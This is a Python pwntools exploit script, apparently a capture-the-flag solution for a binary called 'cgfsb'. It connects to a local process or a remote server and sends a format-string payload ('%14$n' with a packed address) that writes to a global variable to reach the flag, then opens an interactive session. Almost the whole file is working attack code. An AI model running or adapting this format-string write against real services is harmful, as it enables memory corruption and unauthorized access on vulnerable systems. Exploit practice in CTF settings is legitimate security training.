#!/usr/bin/env python
# coding: utf-8

from pwn import *

if len(sys.argv) == 1:
    DEBUG = 1
else:
    DEBUG = 0


r      = lambda x: p.recv(x)
ru     = lambda x: p.recvuntil(x)
rud    = lambda x: p.recvuntil(x, drop=True)
se     = lambda x: p.send(x)
sel    = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

if DEBUG:
    
    context.terminal = ['tmux','splitw','-h']
    context.log_level = 'debug'
    p = process('./cgfsb')
   # libc = ELF("./libc-2.23.so")
else:
    p = remote("111.198.29.45", 31989, timeout=3)
    print("123")
   #gdb.attach(p,"""
#	  b *0x80486cb
#	  c
#	 """)
 
    ru("name:")
    payload="AAAA"
    sel(payload)
    
    #gdb.attach(p,"b*0x80486cd")
    
    #pause()
    ru("please:")
    
    payload="aaaaaaaa"+"%14$naaa"+p32(0x804a068)
    sel(payload)
    ru("flag")
 #   ru("you!")

    p.interactive()


